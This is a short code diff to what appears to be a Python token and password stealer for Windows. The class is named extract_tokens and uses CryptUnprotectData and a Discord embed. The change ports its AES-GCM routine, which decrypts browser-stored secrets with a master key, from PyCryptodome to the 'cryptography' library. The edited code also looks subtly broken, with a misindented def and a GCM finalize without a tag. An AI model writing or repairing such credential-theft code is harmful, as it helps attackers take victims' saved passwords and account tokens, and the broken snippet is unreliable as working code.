@@ -3,7 +3,8 @@ import json
 import os
 import re
 import requests
-from Crypto.Cipher import AES
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
 from discord import Embed
 from win32crypt import CryptUnprotectData
 
@@ -98,13 +99,25 @@ class extract_tokens:
         if r.status_code == 200: return True
         return False
     
-    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
+     def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
         iv = buff[3:15]
         payload = buff[15:]
-        cipher = AES.new(master_key, AES.MODE_GCM, iv)
-        decrypted_pass = cipher.decrypt(payload)
-        decrypted_pass = decrypted_pass[:-16].decode()
-        return decrypted_pass
+        
+        # Create a GCM cipher with the given key and IV
+        cipher = Cipher(
+            algorithms.AES(master_key),
+            modes.GCM(iv),
+            backend=default_backend()
+        )
+        
+        # Create a decryptor
+        decryptor = cipher.decryptor()
+        
+        # Decrypt the payload
+        decrypted_pass = decryptor.update(payload[:-16]) + decryptor.finalize()
+        
+        # Decode the decrypted password
+        return decrypted_pass.decode()
 
     def get_master_key(self, path: str) -> str:
         if not os.path.exists(path): return
